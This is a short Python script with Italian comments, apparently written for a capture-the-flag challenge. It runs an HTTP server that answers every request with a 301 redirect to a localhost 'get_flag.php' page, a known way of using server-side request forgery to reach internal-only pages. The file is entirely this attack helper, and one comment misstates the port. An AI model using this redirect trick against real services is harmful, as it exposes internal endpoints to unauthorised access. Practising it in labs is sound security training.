import http.server
import socketserver

# Configurazione
PORT = 9011 # Cambia da 8080 a 9000
REDIRECT_TARGET = "http://localhost/get_flag.php"

class RedirectHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Invia il codice di stato 301 (Moved Permanently)
        self.send_response(301)
        # Imposta l'header Location con la destinazione
        self.send_header('Location', REDIRECT_TARGET)
        self.end_headers()

# Avvio del server
with socketserver.TCPServer(("", PORT), RedirectHandler) as httpd:
    print(f"Server attivo sulla porta {PORT}. Redirect verso {REDIRECT_TARGET}")
    httpd.serve_forever()